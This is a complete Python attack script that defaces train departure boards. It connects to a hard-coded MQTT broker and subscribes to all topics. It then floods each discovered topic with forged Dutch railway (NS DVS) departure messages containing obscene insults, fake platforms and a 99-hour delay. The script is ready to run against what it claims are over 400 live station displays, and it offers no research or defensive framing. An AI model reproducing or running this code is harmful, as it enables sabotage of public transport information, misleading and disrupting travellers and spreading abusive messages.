#!/usr/bin/env python3
"""
NS DVS MQTT DEFACE v2.3 - PURE PYTHON NO EXTERNAL BULLSHIT
TRUSTEDF57 - Matrix + Audio + Binari - 100% WORKING
NO torsocks NO mosquitto_pub - DIRECT MQTT PUBLISH
"""

import paho.mqtt.client as mqtt
import threading
import time
import random
import xml.etree.ElementTree as ET

HOST = "78.47.35.220"
PORT = 1883
WILDCARD_TOPIC = "#"

MESSAGES = [
    "TRUSTEDF57 FUCK MARTHA ROOT FUCK SOCIETY MORON",
    "TRUSTEDF57 VI FOTTE LE MADRI -TRUSTEDF57 FUCK YOUR ASS"
]

class DVSMatrixHack:
    def __init__(self):
        self.discovered_topics = {}
        self.topic_count = 0
        self.attack_count = 0
        self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９█▓▒░"
        self.publish_client = None
        self.setup_publisher()
    
    def setup_publisher(self):
        """Pure Python MQTT publisher NO external deps"""
        self.publish_client = mqtt.Client()
        self.publish_client.connect(HOST, PORT, 60)
        self.publish_client.loop_start()
    
    def generate_matrix_screen(self):
        matrix_lines = []
        center_msg = MESSAGES[0]
        for i in range(10):
            line = ''.join(random.choices(self.matrix_chars, k=38))
            if i == 5:
                pad_left = (38 - len(center_msg)) // 2
                line = ' ' * pad_left + center_msg + ' ' * (38 - len(center_msg) - pad_left)
            matrix_lines.append(line)
        return '\n'.join(matrix_lines)
    
    def audio_payload(self):
        msg = random.choice(MESSAGES)
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>TRUSTEDF57</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{msg}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">AUDIO HACK SUCCESSO</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def matrix_payload(self):
        matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
        msg2 = MESSAGES[1]
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:DynamischeVertrekStaat>
<ns2:RitId>MATRIXHACK</ns2:RitId>
<ns2:PresentatieOpmerkingen>
<ns2:Uitingen Taal="nl">
<ns2:Uiting Prioriteit="1">{matrix_text[:380]}</ns2:Uiting>
<ns2:Uiting Prioriteit="2">{msg2}</ns2:Uiting>
</ns2:Uitingen>
</ns2:PresentatieOpmerkingen>
<ns2:TreinVertrekSpoor>
<ns2:SpoorNummer>666</ns2:SpoorNummer>
</ns2:TreinVertrekSpoor>
<ns2:ExacteVertrekVertraging>PT99H</ns2:ExacteVertrekVertraging>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def publish_attack(self, topic, payload, attack_type):
        """DIRECT MQTT PUBLISH - NO subprocess"""
        try:
            self.publish_client.publish(topic, payload, qos=2)
            self.attack_count += 1
            print(f"✅ #{self.attack_count} {attack_type} → {topic[-25:]}")
            return True
        except:
            pass
        return False
    
    def full_attack(self, topic):
        self.publish_attack(topic, self.audio_payload(), "AUDIO")
        time.sleep(0.2)
        self.publish_attack(topic, self.matrix_payload(), "MATRIX")
        time.sleep(0.2)
        bin_payload = self.matrix_payload().replace("666", "999")
        self.publish_attack(topic, bin_payload, "BINARI")
    
    def on_message(self, client, userdata, msg):
        topic = msg.topic
        if topic in self.discovered_topics:
            return
        self.discovered_topics[topic] = True
        self.topic_count += 1
        print(f"🎯 #{self.topic_count} LIVE → {topic[-60:]}")
        threading.Thread(target=self.full_attack, args=(topic,), daemon=True).start()
    
    def start(self):
        client = mqtt.Client()
        client.on_message = self.on_message
        client.connect(HOST, PORT, 60)
        client.subscribe(WILDCARD_TOPIC, qos=2)
        print("""
╔══════════════════════════════════════════════════════╗
║  NS DVS v2.3 PURE PYTHON - NO EXTERNAL DEPENDENCIES  ║
║           TRUSTEDF57 DIRECT MQTT PUBLISH              ║
║    400+ Tabelloni MATRIX + AUDIO + BINARI             ║
╚══════════════════════════════════════════════════════╝
        """)
        client.loop_forever()

if __name__ == "__main__":
    hack = DVSMatrixHack()
    hack.start()
